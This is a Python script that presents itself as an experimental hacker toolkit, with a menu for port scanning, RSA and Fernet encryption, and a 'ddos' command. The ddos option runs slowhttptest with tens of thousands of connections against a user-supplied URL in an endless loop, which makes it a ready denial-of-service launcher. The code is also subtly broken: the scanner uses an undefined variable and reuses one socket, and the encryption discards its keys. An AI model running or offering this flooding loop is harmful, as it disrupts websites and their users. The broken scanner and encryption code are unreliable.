import os, socket, time, string, sys
with open('logo','r') as f:
	lg=f.read()
print(lg)
print('Dont mess with hackers')
print('')
print('We can take over the world with just a click of a button')
print('')
print('Author:BlacckPhoenix Official')
print('')
print('NB:This is experimental build of BlacckPhoenix tool')

while 1:
	#rint(lg)
	command=input('Blacck_Phoenix>> ')
	#print(lg)
	if command=='exit':
		exit()
	elif command=='clear':
		os.system('clear')
	elif command=='help':
		print(' ')
		print('''LIST OF ALL COMMANDS''')
		print(' ')
		print('''
			port_scan: scans a target address for open ports

			rsa_encrypt: encryptes stdin with rsa asymmetric encryption

			fernet_encrypt: encryptyed stdin with fernet symmetric encryption

			ddos:initiates a ddos program

			help: shows these messages

			clear: clears

			exit: exits
			''')

	elif command=='rsa_encrypt':
		try:
			import rsa
		except:
			os.system('pip3 install rsa')
		(pubkey,privkey)=rsa.newkeys(1024)
		plain=input('Enter message to encrypt here: ').encode()

		ciphered=rsa.encrypt(plain,pubkey)
		print(ciphered)

		choice=input('Do you want to save the ciphered message to a text file(y/n)')
		if choice=='y' or choice=='Y' or choice=='y ' or choice=='Y ':
			filename=input('Enter filename of the text file: ')
			fullname=f'{filename}.txt'
			with open(fullname,'w') as file1:
				file1.write(str(ciphered))
		else:
			exit()

	elif command=='fernet_encrypt':
		try:
			from cryptography.fernet import Fernet 
		except:
			os.system('pip3 install cryptography')
		key=Fernet.generate_key()
		cipher=Fernet(key)

		plain1=input('Enter message to encrypt').encode()
		plain1=bytes(plain1)

		ciphered=cipher.encrypt(plain1)
		print(ciphered)


	elif command=='port_scan':
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		def scan_port(port_num):		
			try:
				s.connect((host,port))
				return True
			except:	
				#print('UNABLE TO CONNECT CHECK YOUR INTERNET CONNECTION')	
				return False
		host=input('Enter server address')
		for p in range(65535):
			if scan_port(p):	
				t1=time.time()
				print(p)
				t2=time.time()
				print(f'{round(t2-t1)}')
	elif command=='ddos':
		url=input('Enter url to ddos: ')
		print('The attack is in a loop:')
		while True:
			os.system(f'slowhttptest -c 65539 -H -g -o results.txt -u {url} -i 10 -r 200 -x 24 -p 2')

